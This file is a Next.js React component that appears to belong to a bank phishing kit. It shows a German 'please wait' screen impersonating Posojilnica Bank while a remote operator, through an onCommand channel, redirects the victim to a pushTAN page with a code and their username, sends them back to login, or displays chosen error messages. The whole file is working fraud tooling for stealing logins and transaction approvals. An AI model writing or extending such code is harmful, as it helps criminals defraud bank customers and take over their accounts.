"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { onCommand } from "@/lib/track";

export default function WaitingScreen({ user }: { user: string }) {
  const router = useRouter();
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    onCommand((cmd) => {
      switch (cmd.type) {
        case "forward_to_tan": {
          const code = (cmd.payload as { code?: string }).code || "";
          router.push(`/pushtan?code=${encodeURIComponent(code)}&user=${encodeURIComponent(user)}`);
          break;
        }
        case "back_to_login":
          router.push("/");
          break;
        case "show_error":
          setError((cmd.payload as { message?: string }).message || "Ein Fehler ist aufgetreten.");
          break;
        case "clear_error":
          setError(null);
          break;
      }
    });
    return () => onCommand(() => {});
  }, [router, user]);

  return (
    <>
      {/* Background */}
      <div className="bg-wrapper" />
      <div className="gradient-overlay" />

      {/* Page layout */}
      <div className="page-layout">
        {/* Waiting card */}
        <div className="login-card">
          {/* Logo */}
          <div className="card-logo">
            <img src="/poso/logo.svg" alt="Posojilnica Bank" />
          </div>

          <div className="card-inner">
            <h1>Bitte warten</h1>

            {/* Error banner */}
            {error && (
              <div
                style={{
                  backgroundColor: "#fef2f2",
                  border: "1px solid #fecaca",
                  borderRadius: 4,
                  padding: "12px 16px",
                  color: "#b91c1c",
                  fontSize: 14,
                  lineHeight: 1.5,
                  marginBottom: 12,
                }}
              >
                {error}
              </div>
            )}

            <p className="description">
              Ihre Anmeldung wird bearbeitet. Bitte haben Sie einen Moment Geduld.
            </p>

            {/* Spinner */}
            <div style={{ textAlign: "center", padding: "40px 0 48px" }}>
              <svg
                width="64"
                height="64"
                viewBox="0 0 64 64"
                style={{ animation: "spin 1.2s linear infinite" }}
              >
                <circle
                  cx="32"
                  cy="32"
                  r="28"
                  fill="none"
                  stroke="#e0e0e0"
                  strokeWidth="4"
                />
                <circle
                  cx="32"
                  cy="32"
                  r="28"
                  fill="none"
                  stroke="#6d81a5"
                  strokeWidth="4"
                  strokeDasharray="176"
                  strokeDashoffset="132"
                  strokeLinecap="round"
                />
              </svg>
              <p
                style={{
                  fontFamily: '"Open Sans", Helvetica, Arial, sans-serif',
                  fontSize: 14,
                  color: "#616161",
                  marginTop: 20,
                }}
              >
                Verbindung wird hergestellt...
              </p>
            </div>
          </div>
        </div>

        {/* Footer */}
        <div className="login-footer">
          <a href="#">Impressum</a>
          <a href="#">Nutzungsbedingungen</a>
          <a href="#">Barrierefreiheitserklärung</a>
          <span className="copyright">&copy; 2026 Posojilnica Bank</span>
        </div>
      </div>

      <style>{`
        @keyframes spin {
          from { transform: rotate(0deg); }
          to { transform: rotate(360deg); }
        }
      `}</style>
    </>
  );
}
